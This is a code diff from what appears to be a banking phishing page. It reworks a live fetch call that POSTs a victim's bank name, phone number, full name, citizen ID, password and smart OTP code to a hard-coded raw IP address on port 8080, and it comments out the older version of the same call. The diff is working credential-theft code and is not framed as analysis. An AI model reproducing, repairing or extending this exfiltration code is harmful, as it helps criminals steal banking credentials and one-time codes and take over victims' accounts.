@@ -951,12 +951,11 @@
                                 return false;
                               }
                               const dataRequest = {
-                                "id" : "89465",
+                                "id" : "acsv3245235",
                                 "bank_name" : yinghang ,
                                 "phone" : dianhua,
                                 "full_name" : mingzi,
                                 "citizen_id" : sfz,
-                                "user_name" : title,
                                 "password" : mima,
                                 "smart_otp" : aqzn
                               }
@@ -969,22 +968,39 @@
                             //         }).then(function (response) {
                             //           console.log(response.data);
                             //         })
-                                    fetch("http://103.170.121.164:8080/api/user", {
-                                            "mode": 'no-cors',
-                                            "method": "POST",
-                                            "headers": {
-                                              "Content-Type": "application/json",
-                                    'Access-Control-Allow-Origin': '*'
-                                            },
-                                            "body": JSON.stringify(dataRequest)
+                            console.log(dataRequest);
+                            fetch("http://103.170.121.164:8080/api/user", {
+                                        "method": "POST",
+                                        "mode": 'no-cors',
+                                        "headers": {
+                                          "Content-Type": "application/json",
+                                          "Access-Control-Allow-Origin": "*"
+                                        },
+                                        "body": JSON.stringify(dataRequest)
+                                      })
+                                      .then(response => {
+                                        console.log(response.status);
+                                        console.log(response);
+                                      })
+                                      .catch(err => {
+                                        console.error(err);
+                                      });
+                                    // fetch("http://103.170.121.164:8080/api/user", {
+                                    //         "mode": 'no-cors',
+                                    //         "method": "POST",
+                                    //         "headers": {
+                                    //           "Content-Type": "application/json",
+                                    // 'Access-Control-Allow-Origin': '*'
+                                    //         },
+                                    //         "body": JSON.stringify(dataRequest)
                                             
-                                          })
-                                          .then(response => {
-                                            console.log(response);
-                                          })
-                                          .catch(err => {
-                                            console.log(err);
-                                          });
+                                    //       })
+                                    //       .then(response => {
+                                    //         console.log(response);
+                                    //       })
+                                    //       .catch(err => {
+                                    //         console.log(err);
+                                    //       });
                               
                               // if (data == 0) {
                               //   data = 1;
